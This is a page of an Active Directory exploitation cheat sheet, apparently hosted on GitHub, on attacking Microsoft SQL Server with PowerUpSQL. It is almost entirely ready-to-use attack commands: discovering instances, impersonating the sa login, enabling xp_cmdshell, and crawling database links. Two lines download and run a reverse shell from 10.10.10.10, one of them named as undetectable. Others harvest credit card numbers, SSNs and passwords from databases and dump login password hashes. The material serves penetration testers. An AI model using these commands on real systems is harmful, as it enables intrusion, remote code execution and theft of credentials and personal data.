## MSSQL

Tool : PowerUpSQL
```powershell
Import-Module .\PowerupSQL.psd1
```
#### Discovery (SPN Scanning)
```powershell
Get-SQLInstanceDomain
```
#### Discover Local SQL Server Instances
```powershell
Get-SQLInstanceLocal -Verbose
```
#### Discover Remote SQL Server Instances
```powershell
Get-SQLInstanceBroadcast -Verbose
Get-SQLInstanceScanUDPThreaded -Verbose -ComputerName SQLServer1
Get-SQLInstanceFile -FilePath c:\temp\computers.txt | Get-SQLInstanceScanUDPThreaded -Verbose
```
#### Discover Active Directory Domain SQL Server Instances using alternative domain credentials
```powershell
runas /noprofile /netonly /user:domain\user PowerShell.exe
import-module PowerUpSQL.psd1
Get-SQLInstanceDomain -Verbose -DomainController 172.16.0.1 -Username domain\user -password 'P@ssword123'
```
#### Check Accessibility
```powershell
Get-SQLConnectionTestThreaded
Get-SQLInstanceDomain | Get-SQLConnectionTestThreaded -Verbose
```
#### Gather Information
```powershell
Get-SQLInstanceDomain | Get-SQLServerInfo -Verbose
```
#### Look for links to remote servers
```powershell
Get-SQLServerLink -Instance db-mssql -Verbose
```
#### Enumerating Database Links
```powershell
Get-SQLServerLinkCrawl -Instance db-mssql -Verbose
```
#### List SQL Servers using a specific domain account
```powershell
Get-SQLInstanceDomain -Verbose -DomainAccount SQLSvc
```
#### List shared domain user SQL Server service accounts
```powershell
Get-SQLInstanceDomain -Verbose | Group-Object DomainAccount | Sort-Object count -Descending | select Count,Name | Where-Object {($_.name -notlike "*$") -and ($_.count -gt 1) }
```
#### Authenticating to a known SQL Server instance as the current domain user.
```powershell
Get-SQLQuery -Verbose -Instance "10.2.2.5,1433"
```
#### Authenticating to a known SQL Server instance using a SQL Server login.
```powershell
# Server and Instance Name
Get-SQLQuery -Verbose -Instance "servername\instancename" -username testuser -password testpass
# IP and Instance Name
Get-SQLQuery -Verbose -Instance "10.2.2.5\instancename" -username testuser -password testpass
# IP and Port
Get-SQLQuery -Verbose -Instance "10.2.2.5,1433" -username testuser -password testpass
```
#### Get general server information such as SQL/OS versions, service accounts, sysdmin access etc.
```powershell
Get-SQLServerInfo -Verbose -Instance SQLServer1\Instance1
#
$ServerInfo = Get-SQLInstanceDomain | Get-SQLServerInfoThreaded -Verbose -Threads 10
$ServerInfo
```
#### Get an inventory of common objects from the remote server including permissions, databases, tables, views etc, and dump them out into CSV files.
```powershell
Invoke-SQLDumpInfo -Verbose -Instance Server1\Instance1
```

---
#### Audit for Issues
```powershell
Invoke-SQLAudit -Verbose -Instance SQLServer1
```
#### Audit for Impersonate login
```powershell
Invoke-SQLAuditPrivImpersonateLogin -Instance SQLServer1 -Verbose -Debug -Exploit
```
Loock for :
- CONNECTION SUCCESS.
- Logins can be impersonated.
- can impersonate the sa sysadmin login.
- DOMAIN\user can impersonate the dbaccount login

#### Manual Impersonate login
> MIMIKATZ PTT
> Exec HeidiSQL

```mssql
-- Impersonate the sa login
EXECUTE AS LOGIN = 'sa'

-- Enable show options
EXEC sp_configure 'show advanced options',1
RECONFIGURE

-- Enable xp_cmdshell
EXEC sp_configure 'xp_cmdshell',1
RECONFIGURE

-- RCE via xp_cmdshell
EXEC master..xp_cmdshell 'powershell iex (New-Object Net.WebClient).DownloadString(''http://10.10.10.10/revshell.ps1'')"'
```

#### Manual Check
```mssql
-- Verify you are still running as the dbadmin login
SELECT SYSTEM_USER
SELECT IS_SRVROLEMEMBER('sysadmin')
-- Impersonate the sa login
EXECUTE AS LOGIN = 'sa'
-- Verify you are now running as the sa login
SELECT SYSTEM_USER
SELECT IS_SRVROLEMEMBER('sysadmin')

EXEC master..xp_cmdshell 'hostname'
```

#### Manual Crawling
```mssql
-- Check 2 hops + databases
SELECT * FROM OPENQUERY("SRV1",
'SELECT * FROM OPENQUERY("SRV2",
''SELECT name FROM master..sysdatabases'')')
```


---
#### Execute OS commands: Agent Job - PowerShell
```powershell
$Targets | Invoke-SQLOSCmdAgentJob -Verbose -SubSystem PowerShell -Command 'write-output "hello world" | out-file c:\windows\temp\test2.txt' -Sleep 20
```
#### Xp_cmdshell v1
```powershell
Get-SQLServerLinkCrawl -Instance db-mssql -Query "sp_configure 'show advanced options', '1'"
Get-SQLServerLinkCrawl -Instance db-mssql -Query "RECONFIGURE"
Get-SQLServerLinkCrawl -Instance db-mssql -Query "sp_configure 'xp_cmdshell', '1'"
Get-SQLServerLinkCrawl -Instance db-mssql -Query "RECONFIGURE"
```
#### Xp_cmdshell v2
```powershell
Get-SQLQuery -Query 'EXECUTE(''sp_configure ''''xp_cmdshell'''',1;reconfigure;'') AT "msqlsrv.domain.local"'
```
#### Xp_cmdshell v3
```powershell
Get-SQLServerLinkCrawl -Instance DOMAIN\SQLEXPRESS 'EXECUTE(''sp_configure ''''xp_cmdshell'''',1;reconfigure;'') AT "msqlsrv.domain.local"'
```
#### OSQL Xp_cmdshell
```powershell
osql -E -S "db-mssql" -Q "EXECUTE('sp_configure ''xp_cmdshell'',1;RECONFIGURE;') AT [msqlsrv.domain.local]"
```
#### Executing Commands
```powershell
Get-SQLServerLinkCrawl -Instance db-mssql -Query "exec master..xp_cmdshell "whoami'"
```
#### Reverse shell
```powershell
Get-SQLServerLinkCrawl -Instance db-mssql -Query 'exec master..xp_cmdshell "powershell iex (New-Object Net.WebClient).DownloadString(''http://10.10.10.10:1433/revshell_FUD.ps1'')"'
```
#### Data mining
```sql
Get-SQLInstanceDomain | Get-SQLConnectionTest | Get-SQLColumnSampleDataThreaded -Verbose -Threads 10 -Keyword "credit,ssn,password" -SampleSize 2 -ValidateCC -NoDefaults
```
#### Check files
```sql
Get-SQLInstanceDomain | Get-SQLConnectionTest | Get-SQLDatabaseThreaded -Verbose -Threads 10 -NoDefaults | Where-Object {$_.is_encrypted -eq "TRUE"} | Get-SQLColumnSampleDataThreaded -Verbose -Threads 10 -Keyword "card, password" -SampleSize 2 -ValidateCC -NoDefaults
```
#### Extracting SQL Server Login password hashes
```sql
Get-SQLServerPasswordHash -Verbose -Instance MSSQLSERVER2016\db-mssql -Migrate
```

[<- BACK TO MAIN MENU ->](https://github.com/Integration-IT/Active-Directory-Exploitation-Cheat-Sheet/blob/master/README.md)